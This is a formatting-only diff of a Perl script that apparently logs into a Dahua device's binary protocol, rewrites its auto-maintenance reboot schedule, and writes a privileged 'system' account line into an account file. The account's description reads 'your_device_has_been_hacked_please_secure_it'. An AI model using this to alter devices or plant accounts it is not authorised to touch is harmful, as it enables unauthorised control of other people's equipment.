@@ -43,20 +43,16 @@ eval {
 		$rdata = bn::io::xread $fh, $rdata, 15;
 	};
 
-	my $login = pack "CxxC x4 a8 a8 CCx4CC",
-		0xa0,     0x60,
-		"system", "not-the-real-password",
-		4,        2, 0xa1, 0xaa;
+	my $login = pack "CxxC x4 a8 a8 CCx4CC", 0xa0, 0x60, "system", "not-the-real-password", 4, 2, 0xa1, 0xaa;
 
 	$req->($login);
 
 	0xb0 == ord $reply
 		or die "no 0xb0 reply\n";
 
-	#      my $sid = unpack "x16 L<", $reply;
+	#		my $sid = unpack "x16 L<", $reply;
 
-	my $pkt = pack "Cx3 x4 a8 Cx7 x8",
-		0xa3, "config", 18;    # CONFIG_TYPE_AUTO_MT
+	my $pkt = pack "Cx3 x4 a8 Cx7 x8", 0xa3, "config", 18;    # CONFIG_TYPE_AUTO_MT
 
 	$req->($pkt);
 
@@ -66,8 +62,7 @@ eval {
 	# posix 0 == thursday, -3 to go into dahua, +3 to reboot not today
 	substr $rdata, 8, 1, chr 2 + time / 86400 % 7;
 
-	my $pkt = pack "Cx3 L< a8 Cx7 x8 a*",
-		0xc1, length $rdata, "config", 18, $rdata; # CONFIG_TYPE_AUTO_MT
+	my $pkt = pack "Cx3 L< a8 Cx7 x8 a*", 0xc1, length $rdata, "config", 18, $rdata;    # CONFIG_TYPE_AUTO_MT
 
 	$req->($pkt);
 
@@ -111,8 +106,7 @@ sub init
 		}
 
 		if ($max++) {
-			print $fh
-				"$max:system:not-the-real-password:1:Account, Control, AutoMaintain, GeneralConf, DefaultConfig:your_device_has_been_hacked_please_secure_it:1:16\n";
+			print $fh "$max:system:not-the-real-password:1:Account, Control, AutoMaintain, GeneralConf, DefaultConfig:your_device_has_been_hacked_please_secure_it:1:16\n";
 		}
 	};
 
